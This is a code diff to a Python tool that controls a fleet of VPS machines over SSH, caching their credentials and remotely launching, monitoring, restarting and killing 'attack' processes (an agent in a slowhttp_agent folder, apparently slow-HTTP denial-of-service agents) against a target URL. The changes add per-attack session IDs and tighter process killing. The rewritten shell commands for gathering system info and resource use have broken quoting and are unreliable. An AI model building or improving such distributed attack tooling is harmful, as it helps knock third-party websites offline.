@@ -117,6 +117,13 @@ class Colors:
     else:
         RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = BOLD = DIM = RESET = ""
 
+
+def generate_session_id():
+    """Generate unique session ID for attack processes"""
+    import random
+    import string
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
 class SecurityManager:
     """Handles security operations like encryption and validation"""
     
@@ -221,12 +228,27 @@ class SecurityManager:
             return False
     
     def sanitize_input(self, input_str, max_length=None):
-        """Sanitize user input to prevent injection attacks"""
+        """Sanitize user input to prevent command injection"""
         if not input_str:
             return ""
         
-        # Remove dangerous characters
-        sanitized = re.sub(r'[;\'&quot;\\\]', '', str(input_str))
+        # Convert to string
+        sanitized = str(input_str)
+        
+        # Remove dangerous characters and command injection patterns
+        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '<', '>', '(', ')', '{', '}', '[', ']']
+        for char in dangerous_chars:
+            sanitized = sanitized.replace(char, '')
+        
+        # Remove command substitution patterns
+        sanitized = re.sub(r'\$\([^)]*\)', '', sanitized)  # Remove $(...)
+        sanitized = re.sub(r'`[^`]*`', '', sanitized)         # Remove `...`
+        
+        # Remove multiple spaces
+        sanitized = re.sub(r'\s+', ' ', sanitized)
+        
+        # Strip leading/trailing whitespace
+        sanitized = sanitized.strip()
         
         # Limit length if specified
         if max_length and len(sanitized) > max_length:
@@ -780,6 +802,7 @@ class SSHManager:
         self.connections = {}
         self.security_manager = security_manager
         self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
+        self.cache_lock = threading.Lock()
     
     def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
         """Connect to a VPS with comprehensive error handling"""
@@ -793,7 +816,11 @@ class SSHManager:
             self.connection_cache[ip] = {
                 'username': username,
                 'encrypted_password': encrypted_password,
-                'port': port
+                'port': port,
+                'target': '',
+                'attack_type': '',
+                'session_id': '',
+                'last_updated': time.time()
             }
             
             ssh = paramiko.SSHClient()
@@ -944,7 +971,12 @@ class SSHManager:
         """Restart attack process on VPS"""
         try:
             # Kill existing attack process
-            kill_cmd = "pkill -f 'python3 agent.py'"
+            # Get session ID from cache if available
+            session_id = self.connection_cache.get(ip, {}).get('session_id', '')
+            if session_id:
+                kill_cmd = f"pkill -f 'python3 agent.py.*{session_id}'"
+            else:
+                kill_cmd = "pkill -f 'python3 agent.py'"
             success, output = self.execute_command(ip, kill_cmd, auto_reconnect=False)
             
             # Start new attack process
@@ -1054,17 +1086,17 @@ class SSHManager:
             # Create a command to gather system information
             cmd = """
             echo "{"
-            echo "  \&quot;hostname\&quot;: \&quot;$(hostname)\&quot;,"
-            echo "  \&quot;os\&quot;: \&quot;$(cat /etc/os-release | grep PRETTY_NAME | cut -d '=' -f 2 | tr -d '\&quot;')\&quot;,"
-            echo "  \&quot;kernel\&quot;: \&quot;$(uname -r)\&quot;,"
-            echo "  \&quot;cpu\&quot;: \&quot;$(grep 'model name' /proc/cpuinfo | head -1 | cut -d ':' -f 2 | xargs)\&quot;,"
-            echo "  \&quot;cpu_cores\&quot;: $(grep -c processor /proc/cpuinfo),"
-            echo "  \&quot;memory_total\&quot;: \&quot;$(free -h | grep Mem | awk '{print $2}')\&quot;,"
-            echo "  \&quot;memory_used\&quot;: \&quot;$(free -h | grep Mem | awk '{print $3}')\&quot;,"
-            echo "  \&quot;disk_total\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $2}')\&quot;,"
-            echo "  \&quot;disk_used\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $3}')\&quot;,"
-            echo "  \&quot;python_version\&quot;: \&quot;$(python3 --version 2>&1)\&quot;,"
-            echo "  \&quot;uptime\&quot;: \&quot;$(uptime -p)\&quot;"
+            echo "  "hostname": "$(hostname)","
+            echo "  "os": "$(cat /etc/os-release | grep PRETTY_NAME | cut -d = -f 2 | tr -d ")","
+            echo "  "kernel": "$(uname -r)","
+            echo "  "cpu": "$(grep model name /proc/cpuinfo | head -1 | cut -d : -f 2 | xargs)","
+            echo "  "cpu_cores": $(grep -c processor /proc/cpuinfo),"
+            echo "  "memory_total": "$(free -h | grep Mem | awk {print $2})","
+            echo "  "memory_used": "$(free -h | grep Mem | awk {print $3})","
+            echo "  "disk_total": "$(df -h / | tail -1 | awk {print $2})","
+            echo "  "disk_used": "$(df -h / | tail -1 | awk {print $3})","
+            echo "  "python_version": "$(python3 --version 2>&1)","
+            echo "  "uptime": "$(uptime -p)""
             echo "}"
             """
             
@@ -3816,7 +3848,7 @@ class AttackManager:
         cmd = "cd ~/slowhttp_agent && nohup python3 agent.py "
         
         # Add target
-        cmd += f"--target &quot;{target_url}&quot; "
+        cmd += f"--target "{target_url}""
         
         # Add attack type
         cmd += f"--attack-type {attack_type} "
@@ -3897,7 +3929,7 @@ class AttackManager:
                     continue
                 
                 # Get CPU and memory usage
-                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 &quot; &quot; $4}'"
+                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk {print $3 " " $4}"
                 success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                 
                 cpu_usage = None
@@ -4023,8 +4055,12 @@ class AttackManager:
         for vps_ip in attack_info['vps_list']:
             print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
             
-            # Kill all agent.py processes
-            cmd = "pkill -f 'python3 agent.py'"
+            # Kill agent.py processes for this specific attack session
+            session_id = attack_info.get('session_id', '')
+            if session_id:
+                cmd = f"pkill -f 'python3 agent.py.*{session_id}'"
+            else:
+                cmd = "pkill -f 'python3 agent.py'"
             success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
             
             if success:
